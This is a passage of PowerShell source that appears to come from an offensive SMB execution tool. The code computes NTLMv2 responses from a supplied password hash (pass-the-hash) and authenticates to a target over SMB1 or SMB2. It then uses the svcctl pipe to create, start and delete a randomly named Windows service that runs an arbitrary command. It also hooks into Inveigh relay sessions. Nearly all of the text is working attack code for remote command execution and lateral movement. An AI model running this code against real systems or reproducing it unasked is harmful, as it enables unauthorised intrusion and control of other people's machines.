            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }

        }

    }

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $client = $inveigh.session_socket_table[$session]
            $client_stream = $client.GetStream()
            $session_ID = $inveigh.session_table[$session]
            $message_ID =  $inveigh.session_message_ID_table[$session]
            $tree_ID = 0x00,0x00,0x00,0x00
            $SMB_signing = $false
        }

        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
                
            }

        }
        
        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)

        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = "%COMSPEC% /C `"" + $Command + "`""
        }
        else
        {
            $Command = "`"" + $Command + "`""
        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
        
        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
        $SMB_split_index = 4256
        
        if($SMB_version -eq 'SMB1')
        {
            $stage = 'TreeConnectAndXRequest'

            while ($stage -ne 'Exit')
            {
            
                switch ($stage)
                {
            
                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $client_receive[88..107]

                            if($SMB_execute)
                            {
                                Write-Verbose "$output_username has Service Control Manager write privilege on $Target"  
                                $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output "$output_username has Service Control Manager write privilege on $Target"
                                $SMB_close_service_handle_stage = 2
                                $stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '05-00-00-00')
                        {
                            Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"
                            $stage = 'Exit'
                        }
                        else
                        {
                            Write-Output "[-] Something went wrong with $Target"
                            $stage = 'Exit'
                        }

                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'TreeDisconnect'
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose "Service $SMB_service deleted on $Target"
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                    }

                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'RPCBind'
                    }
                  
                    'CreateServiceW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID
                        
                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'StartServiceW'
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'StartServiceW'
                    }

                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            Write-Output "[+] Command executed with service $SMB_service on $Target"
                        }
                        elseif([System.BitConverter]::ToString($client_receive[88..91]) -eq '02-00-00-00')
                        {
                            Write-Output "[-] Service $SMB_service failed to start on $Target"
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
